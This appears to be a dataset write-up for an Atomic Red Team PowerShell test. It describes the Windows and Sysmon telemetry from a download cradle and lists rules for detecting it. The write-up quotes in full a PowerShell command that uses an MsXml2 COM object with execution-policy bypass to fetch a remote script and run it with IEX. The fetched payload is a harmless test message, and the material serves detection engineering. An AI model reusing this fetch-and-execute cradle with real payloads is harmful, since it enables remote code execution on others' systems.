# T1059.001-6: PowerShell — Powershell MsXml COM object - with prompt

## Technique Context

T1059.001 (PowerShell) is a fundamental execution technique where adversaries leverage PowerShell to run commands, download payloads, and perform various malicious activities. This specific test demonstrates a "download cradle" pattern using the MsXml2.ServerXmlHttp COM object to retrieve and execute remote PowerShell scripts. This technique is commonly used by malware families and penetration testing tools because it bypasses many static detection mechanisms while providing full PowerShell execution capabilities. The detection community typically focuses on command-line arguments, COM object instantiation, network connections to suspicious domains, and the use of Invoke-Expression (IEX) for dynamic code execution.

## What This Dataset Contains

The dataset captures a complete execution chain showing PowerShell downloading and executing a remote script. Security Event ID 4688 shows the process creation with the full command line: `powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"`. The PowerShell operational logs capture the technique execution with EID 4103 showing `New-Object -ComObject MsXml2.ServerXmlHttp` and subsequent `Invoke-Expression` with the downloaded payload content. EID 4104 script block logging reveals the downloaded payload: `write-host -ForegroundColor Cyan "$(Get-Date -Format s) Download Cradle test success!"`. Sysmon captures the process hierarchy (cmd.exe → powershell.exe) with EID 1, process access events with EID 10 showing PowerShell accessing spawned processes, and DLL loading events with EID 7 including urlmon.dll which handles the HTTP request functionality.

## What This Dataset Does Not Contain

The dataset is missing the actual network connection telemetry that would show the HTTPS request to raw.githubusercontent.com. While urlmon.dll is loaded (indicating network capability), there are no Sysmon EID 3 (NetworkConnect) events showing the outbound connection to the remote server. The dataset also lacks DNS resolution events (Sysmon EID 22) that would typically precede the HTTP request. This could be due to the sysmon-modular configuration filtering these events or the network request being handled through system-level APIs that don't trigger the expected Sysmon network events. File creation events for any cached or temporary files related to the download are also absent.

## Assessment

This dataset provides excellent coverage for detecting PowerShell-based download cradles from a process execution and command-line perspective. The Security channel's process creation events with full command-line logging capture the complete attack vector, while PowerShell operational logs provide granular visibility into COM object instantiation and script block execution. However, the missing network telemetry significantly limits the dataset's utility for detecting the network-based indicators of this technique. The rich process execution and PowerShell logging make this dataset valuable for building host-based detections, but network-focused detection strategies would require additional data sources.

## Detection Opportunities Present in This Data

1. **PowerShell execution with bypass parameters and COM object creation** - Monitor for `powershell.exe` command lines containing both `-exec bypass` and `New-Object -ComObject MsXml2.ServerXmlHttp` patterns (Security EID 4688)

2. **PowerShell script block containing download cradle patterns** - Alert on PowerShell EID 4104 script blocks containing combinations of `MsXml2.ServerXmlHttp`, `.Open`, `.Send`, and `IEX` or `Invoke-Expression`

3. **PowerShell module logging for suspicious COM object instantiation** - Monitor PowerShell EID 4103 CommandInvocation events for `New-Object` cmdlets with `-ComObject` parameter values of `MsXml2.ServerXmlHttp`, `MSXML2.XMLHTTP`, or similar HTTP-capable COM objects

4. **Suspicious process chain involving cmd.exe spawning PowerShell with network-related parameters** - Detect Sysmon EID 1 events where cmd.exe creates powershell.exe processes with command lines containing URLs and execution policy bypass flags

5. **PowerShell loading network-related DLLs combined with COM object usage** - Correlate Sysmon EID 7 events showing urlmon.dll loading in PowerShell processes with PowerShell operational logs showing HTTP-related COM object creation

6. **Invoke-Expression usage with external content** - Monitor PowerShell EID 4103 events for `Invoke-Expression` cmdlet execution, especially when correlated with network-capable COM object instantiation in the same PowerShell session
